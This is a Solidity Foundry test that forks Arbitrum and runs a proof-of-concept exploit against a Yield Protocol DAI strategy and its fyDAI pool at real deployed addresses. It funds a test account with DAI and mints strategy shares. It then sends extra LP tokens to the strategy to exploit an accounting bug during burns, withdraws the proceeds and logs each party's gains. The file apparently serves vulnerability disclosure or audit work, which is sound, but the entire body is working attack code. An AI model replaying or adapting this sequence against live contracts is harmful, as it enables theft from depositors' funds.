// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.13;

import "forge-std/Test.sol";
import "@openzeppelin/interfaces/IERC20.sol";

interface IStrategy {
    enum State {DEPLOYED, DIVESTED, INVESTED, EJECTED, DRAINED}

    function state() external view returns(State);                          // The state determines which functions are available
    function base() external view returns(address);                          // Base token for this strategy (inherited from StrategyMigrator)
    function fyToken() external view returns(address);                     // Current fyToken for this strategy (inherited from StrategyMigrator)
    function pool() external view returns(address);                           // Current pool that this strategy invests in
    function cached() external view returns(uint256);                       // Base tokens owned by the strategy after the last operation
    function fyTokenCached() external view returns(uint256);                // In emergencies, the strategy can keep fyToken of one series

    /// @dev Mint the first strategy tokens, without investing
    function init(address to)
        external
        returns (uint256 baseIn, uint256 fyTokenIn, uint256 minted);

    /// @dev Start the strategy investments in the next pool
    /// @notice When calling this function for the first pool, some underlying needs to be transferred to the strategy first, using a batchable router.
    function invest(IPool pool_)
        external
        returns (uint256 poolTokensObtained);


    /// @dev Divest out of a pool once it has matured
    function divest()
        external
        returns (uint256 baseObtained);

    /// @dev Divest out of a pool at any time. If possible the pool tokens will be burnt for base and fyToken, the latter of which
    /// must be sold to return the strategy to a functional state. If the pool token burn reverts, the pool tokens will be transferred
    /// to the caller as a last resort.
    /// @notice The caller must take care of slippage when selling fyToken, if relevant.
    function eject()
        external
        returns (uint256 baseObtained, uint256 fyTokenObtained);

    /// @dev Buy ejected fyToken in the strategy at face value
    /// @param fyTokenTo Address to send the purchased fyToken to.
    /// @param baseTo Address to send any remaining base to.
    /// @return soldFYToken Amount of fyToken sold.
    /// @return returnedBase Amount of base unused and returned.
    function buyFYToken(address fyTokenTo, address baseTo)
        external
        returns (uint256 soldFYToken, uint256 returnedBase);

    /// @dev If we ejected the pool tokens, we can recapitalize the strategy to avoid a forced migration
    function restart()
        external
        returns (uint256 baseIn);

    /// @dev Mint strategy tokens with pool tokens. It can be called only when invested.
    /// @notice The pool tokens that the user contributes need to have been transferred previously, using a batchable router.
    function mint(address to)
        external
        returns (uint256 minted);

    /// @dev Burn strategy tokens to withdraw pool tokens. It can be called only when invested.
    /// @notice The strategy tokens that the user burns need to have been transferred previously, using a batchable router.
    function burn(address to)
        external
        returns (uint256 poolTokensObtained);

    /// @dev Mint strategy tokens with base tokens. It can be called only when not invested and not ejected.
    /// @notice The base tokens that the user invests need to have been transferred previously, using a batchable router.
    function mintDivested(address to)
        external
        returns (uint256 minted);
    
    /// @dev Burn strategy tokens to withdraw base tokens. It can be called when not invested and not ejected.
    /// @notice The strategy tokens that the user burns need to have been transferred previously, using a batchable router.
    function burnDivested(address baseTo)
        external
        returns (uint256 baseObtained);

    /// @dev Token used as rewards
    function rewardsToken() external view returns(address);
    
    /// @dev Rewards schedule
    function rewardsPeriod() external view returns(uint32 start, uint32 end);

    /// @dev Rewards per token
    function rewardsPerToken() external view returns(uint128 accumulated, uint32 lastUpdated, uint96 rate);
    
    /// @dev Rewards accumulated by users
    function rewards(address user) external view returns(uint128 accumulatedUserStart, uint128 accumulatedCheckpoint);

    /// @dev Set the rewards token
    function setRewardsToken(address rewardsToken_)
        external;

    /// @dev Set a rewards schedule
    function setRewards(uint32 start, uint32 end, uint96 rate)
        external;

    /// @dev Claim all rewards from caller into a given address
    function claim(address to)
        external
        returns (uint256 claiming);

    /// @dev Trigger a claim for any user
    function remit(address user)
        external
        returns (uint256 claiming);
}

interface IPool is IERC20 {
    function baseToken() external view returns(address);
    function base() external view returns(address);
    function burn(address baseTo, address fyTokenTo, uint256 minRatio, uint256 maxRatio) external returns (uint256, uint256, uint256);
    function burnForBase(address to, uint256 minRatio, uint256 maxRatio) external returns (uint256, uint256);
    function buyBase(address to, uint128 baseOut, uint128 max) external returns(uint128);
    function buyBasePreview(uint128 baseOut) external view returns(uint128);
    function buyFYToken(address to, uint128 fyTokenOut, uint128 max) external returns(uint128);
    function buyFYTokenPreview(uint128 fyTokenOut) external view returns(uint128);
    function currentCumulativeRatio() external view returns (uint256 currentCumulativeRatio_, uint256 blockTimestampCurrent);
    function cumulativeRatioLast() external view returns (uint256);
    function fyToken() external view returns(address);
    function g1() external view returns(int128);
    function g2() external view returns(int128);
    function getC() external view returns (int128);
    function getCurrentSharePrice() external view returns (uint256);
    function getCache() external view returns (uint104 baseCached, uint104 fyTokenCached, uint32 blockTimestampLast, uint16 g1Fee_);
    function getBaseBalance() external view returns(uint128);
    function getFYTokenBalance() external view returns(uint128);
    function getSharesBalance() external view returns(uint128);
    function init(address to) external returns (uint256, uint256, uint256);
    function maturity() external view returns(uint32);
    function mint(address to, address remainder, uint256 minRatio, uint256 maxRatio) external returns (uint256, uint256, uint256);
    function mu() external view returns (int128);
    function mintWithBase(address to, address remainder, uint256 fyTokenToBuy, uint256 minRatio, uint256 maxRatio) external returns (uint256, uint256, uint256);
    function retrieveBase(address to) external returns(uint128 retrieved);
    function retrieveFYToken(address to) external returns(uint128 retrieved);
    function retrieveShares(address to) external returns(uint128 retrieved);
    function scaleFactor() external view returns(uint96);
    function sellBase(address to, uint128 min) external returns(uint128);
    function sellBasePreview(uint128 baseIn) external view returns(uint128);
    function sellFYToken(address to, uint128 min) external returns(uint128);
    function sellFYTokenPreview(uint128 fyTokenIn) external view returns(uint128);
    function setFees(uint16 g1Fee_) external;
    function sharesToken() external view returns(address);
    function ts() external view returns(int128);
    function wrap(address receiver) external returns (uint256 shares);
    function wrapPreview(uint256 assets) external view returns (uint256 shares);
    function unwrap(address receiver) external returns (uint256 assets);
    function unwrapPreview(uint256 shares) external view returns (uint256 assets);
    /// Returns the max amount of FYTokens that can be sold to the pool
    function maxFYTokenIn() external view returns (uint128) ;
    /// Returns the max amount of FYTokens that can be bought from the pool
    function maxFYTokenOut() external view returns (uint128) ;
    /// Returns the max amount of Base that can be sold to the pool
    function maxBaseIn() external view returns (uint128) ;
    /// Returns the max amount of Base that can be bought from the pool
    function maxBaseOut() external view returns (uint128);
    /// Returns the result of the total supply invariant function
    function invariant() external view returns (uint128);
}

contract YieldProtocol is Test {
    using stdStorage for StdStorage;
    
    IPool FYDAI2309LPArbitrum = IPool(0x9a364e874258D6B76091D928ce69512Cd905EE68);
    IERC20 FYDAI2309Arbitrum = IERC20(0xEE508c827a8990c04798B242fa801C5351012B23 );
    IStrategy strategyYSDAI6MMS = IStrategy(0x5aeB4EFaAA0d27bd606D618BD74Fe883062eAfd0);
    IERC20 daiArbitrum = IERC20(payable(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1));

    address internal ada = address(0xada);

    function setUp() public {   
        vm.createSelectFork("https://rpc.ankr.com/arbitrum", 92381336);
    }

    struct CacheData {
        uint256 cacheHolderBase;
        uint256 cachePoolBase;
        uint256 cacheStrategyBase;
        uint256 cacheHolderFYToken;
        uint256 cachePoolFYToken;
        uint256 cacheStrategyFYToken;
        uint256 cacheHolderLPToken;
        uint256 cachePooLPToken;
        uint256 cacheStrategyLPToken;
    }

  function testStrategyV2DAI6MMSWithDeal() public {
    CacheData memory accountsBefore;
    CacheData memory accountsAfter;

    //mint base tokens
    console.log(daiArbitrum.balanceOf(ada));
    deal(address(daiArbitrum), ada, 1e24);
    console.log(daiArbitrum.balanceOf(ada));

    //caching accounts status after transactions
    accountsBefore =  CacheData(
      daiArbitrum.balanceOf(ada),
      daiArbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
      daiArbitrum.balanceOf(address(strategyYSDAI6MMS)),
      FYDAI2309Arbitrum.balanceOf(ada),
      FYDAI2309Arbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
      FYDAI2309Arbitrum.balanceOf(address(strategyYSDAI6MMS)),
      FYDAI2309LPArbitrum.balanceOf(ada),
      FYDAI2309LPArbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
      FYDAI2309LPArbitrum.balanceOf(address(strategyYSDAI6MMS))
    );

    //transfer base token in pool and buy FYToken to be left in pool
    vm.startPrank(ada);
    daiArbitrum.transfer(address(FYDAI2309LPArbitrum), 1e21);

    // Buy fyToken with base.
    FYDAI2309LPArbitrum.buyFYToken(address(FYDAI2309LPArbitrum), 3e20,0);
    
    //transfer again base token in pool to mint LP tokens and send to ADA account
    daiArbitrum.transfer(address(FYDAI2309LPArbitrum), 1e23);
    (uint256 baseIn, uint256 fyTokenIn, uint256 lpTokensMinted) = FYDAI2309LPArbitrum.mintWithBase(ada,ada,2e21,0, type(uint128).max);
    
    //amount of token for multiplying shares burning
    uint256 LPTokenMultiplier = 2e22;

    //transfer a part of LP tokens for minting strategy' shares
    FYDAI2309LPArbitrum.transfer(address(strategyYSDAI6MMS),FYDAI2309LPArbitrum.balanceOf(ada)-LPTokenMultiplier);
    uint256 tokensObtained = strategyYSDAI6MMS.mint(address(strategyYSDAI6MMS)); 
    
    //transfer of LP tokens remainder for exploiting the bug
    FYDAI2309LPArbitrum.transfer(address(strategyYSDAI6MMS), LPTokenMultiplier);
    
    //burning of strategy tokens
    uint256 tokensBurnt = strategyYSDAI6MMS.burn(ada);

    //burning remaing part of LP tokens sent to strategy
    strategyYSDAI6MMS.mint(address(strategyYSDAI6MMS));
    strategyYSDAI6MMS.burn(ada);

    //retrieving and converting all tokens to base token
    FYDAI2309LPArbitrum.transfer(address(FYDAI2309LPArbitrum), FYDAI2309LPArbitrum.balanceOf(ada));
    FYDAI2309LPArbitrum.burnForBase(ada,0,type(uint128).max); // get fyToken to the ADA
    FYDAI2309LPArbitrum.retrieveBase(ada); // get DAI stored on the contract to the ADA
    FYDAI2309LPArbitrum.retrieveFYToken(ada);  // get fyToken stoeed on the contract to the ADA.
    
    console.log("baseIn", baseIn);
    console.log("fyTokenIn", fyTokenIn);
    console.log("lpTokensMinted", lpTokensMinted);
    console.log("tokensObtained", tokensObtained);
    console.log("tokensBurnt", tokensBurnt);
          
    //caching accounts status after transactions
    accountsAfter =  CacheData(
      daiArbitrum.balanceOf(ada),
      daiArbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
      daiArbitrum.balanceOf(address(strategyYSDAI6MMS)),
      FYDAI2309Arbitrum.balanceOf(ada),
      FYDAI2309Arbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
      FYDAI2309Arbitrum.balanceOf(address(strategyYSDAI6MMS)),
      FYDAI2309LPArbitrum.balanceOf(ada),
      FYDAI2309LPArbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
      FYDAI2309LPArbitrum.balanceOf(address(strategyYSDAI6MMS))
    );

    //logging all accounts differences
    console2.log("holder gain in base wei : ", int256(accountsAfter.cacheHolderBase) - int256(accountsBefore.cacheHolderBase));
    console2.log("pool gain in base wei : ", int256(accountsAfter.cachePoolBase) - int256(accountsBefore.cachePoolBase));
    console2.log("Strategy gain in base wei : ", int256(accountsAfter.cacheStrategyBase) - int256(accountsBefore.cacheStrategyBase));
    console2.log("holder gain in FYToken : ", int256(accountsAfter.cacheHolderFYToken) - int256(accountsBefore.cacheHolderFYToken));
    console2.log("pool gain in FYToken : ", int256(accountsAfter.cachePoolFYToken) - int256(accountsBefore.cachePoolFYToken));
    console2.log("Strategy gain in FYToken : ", int256(accountsAfter.cacheStrategyFYToken) - int256(accountsBefore.cacheStrategyFYToken));       
    console2.log("holder gain in LPToken : ", int256(accountsAfter.cacheHolderLPToken) - int256(accountsBefore.cacheHolderLPToken));
    console2.log("pool gain in LPToken : ", int256(accountsAfter.cachePooLPToken) - int256(accountsBefore.cachePooLPToken));
    console2.log("Strategy gain in LPToken : ", int256(accountsAfter.cacheStrategyLPToken) - int256(accountsBefore.cacheStrategyLPToken));
    console2.log("Pool base token amount before transactions: %e", int256(accountsBefore.cachePoolBase));
    console2.log("Pool base token amount after transactions: %e", int256(accountsAfter.cachePoolBase) );
    console2.log("holder base token amount before transactions: %e", int256(accountsBefore.cacheHolderBase));
    console2.log("holder base token amount after transactions: %e", int256(accountsAfter.cacheHolderBase) );
  }  
}